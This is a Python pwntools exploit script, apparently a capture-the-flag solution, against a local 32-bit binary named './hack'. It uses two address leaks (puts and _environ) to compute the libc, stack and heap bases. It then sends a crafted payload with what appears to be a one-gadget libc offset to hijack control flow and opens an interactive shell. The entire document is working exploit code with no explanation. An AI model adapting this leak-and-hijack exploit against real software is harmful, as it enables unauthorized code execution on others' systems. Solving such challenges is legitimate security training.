from pwn import *
#context.log_level = 'debug'
p = process("./hack")
elf = ELF("./hack")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")


p.recvuntil("input address: \n")
p.sendline("134520860")
p.recvuntil("0x")
addr = int(p.recvuntil("\n",drop=True),16)
print hex(addr)


libc_base = addr - libc.symbols['puts']

environ_addr = libc_base+libc.symbols['_environ']

p.recvuntil("Second chance: \n")
p.sendline(str(environ_addr))
p.recvuntil("0x")
stack_addr = int(p.recvuntil("\n",drop=True),16)-(0xffffdef0-4-0xfffdd000)


ret_addr = stack_addr+0xffffd05c-0x804b000
p.recvuntil("node is ")
heap=int(p.readuntil(",")[:-1],16)-0x20
log.info(hex(libc_base))
log.info(hex(stack_addr))
log.info(hex(heap))
#gdb.attach(p,'b *0x8048706')
libc.address=libc_base
payload  = p32(0x3ac69+libc_base)+p32(0)+p32(0xffffd054-12+stack_addr-0xfffdc220)+p32(heap+0x24)
p.sendafter("now: ",payload)
p.interactive(">")
